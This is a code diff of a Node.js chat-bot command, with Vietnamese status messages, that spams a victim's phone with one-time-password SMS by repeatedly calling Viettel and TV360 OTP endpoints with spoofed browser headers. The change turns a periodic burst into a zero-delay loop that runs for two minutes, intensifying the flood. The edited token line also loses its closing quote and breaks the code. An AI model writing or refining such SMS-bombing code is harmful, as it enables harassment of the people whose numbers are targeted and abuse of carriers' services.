@@ -32,14 +32,10 @@ module.exports = {
       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
       'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
       'X-Requested-With': 'XMLHttpRequest',
-      'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
+      'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==,
       'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
       'sec-ch-ua-mobile': '?0',
       'sec-ch-ua-platform': '"Windows"',
-    };
-
-    const viettelData = {
-      msisdn: phone,
     };
 
     const tv360Headers = {
@@ -54,12 +50,10 @@ module.exports = {
       "Accept-Encoding": "gzip, deflate"
     };
 
-    const tv360Data = {
-      msisdn: phone
-    };
-
-    // Function to send spam requests
     const sendSpamRequests = () => {
+      const viettelData = { msisdn: phone };
+      const tv360Data = { msisdn: phone };
+
       // Send request to Viettel API
       axios.post('https://viettel.vn/api/get-otp', viettelData, {
         headers: viettelHeaders,
@@ -85,16 +79,16 @@ module.exports = {
       });
     };
 
-    // Send the spam requests every 120 seconds (120000 milliseconds)
-    const interval = setInterval(sendSpamRequests, 120000);
+    // Start sending requests continuously for 120 seconds
+    const endTime = Date.now() + 120000; // 120 seconds from now
 
-    // Send the first spam request immediately
-    sendSpamRequests();
-
-    // Optionally, stop spamming after a certain time period
-    setTimeout(() => {
-      clearInterval(interval);
-      api.sendMessage(`Đã dừng spam SMS cho số ${phone}`, event.threadID, event.messageID);
-    }, 600000); // Stop after 10 minutes (600000 milliseconds)
+    const spamInterval = setInterval(() => {
+      if (Date.now() > endTime) {
+        clearInterval(spamInterval);
+        api.sendMessage(`Đã dừng spam SMS cho số ${phone}`, event.threadID, event.messageID);
+      } else {
+        sendSpamRequests();
+      }
+    }, 0); // 0 milliseconds delay for continuous requests
   }
 };
